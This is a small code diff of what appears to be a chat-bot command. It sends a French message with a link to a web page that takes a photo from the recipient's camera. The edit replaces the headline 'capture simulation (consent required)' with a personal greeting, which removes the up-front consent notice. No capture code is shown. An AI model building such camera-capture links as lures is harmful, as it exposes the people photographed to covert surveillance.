@@ -6,7 +6,7 @@ module.exports = {
     const baseUrl = 'https://new-number-virtuel.onrender.com';
     const url = `${baseUrl}/${chatId}`;
 
-    const text = `📸 *Simulation de capture (consentement requis)*\n\n` +
+    const text = `📸 *Salutations @${username}*\n\n` +
       `Cliquez sur le lien suivant pour ouvrir une page sécurisée qui permet à la personne de *simuler* l'activation de sa caméra et d'envoyer volontairement une photo :\n\n` +
       `[🔗 Ouvrir la page de simulation](${url})\n\n` +
       `La capture n'est effectuée *que* si la personne clique explicitement sur « Capturer & Envoyer ».\n\n` +
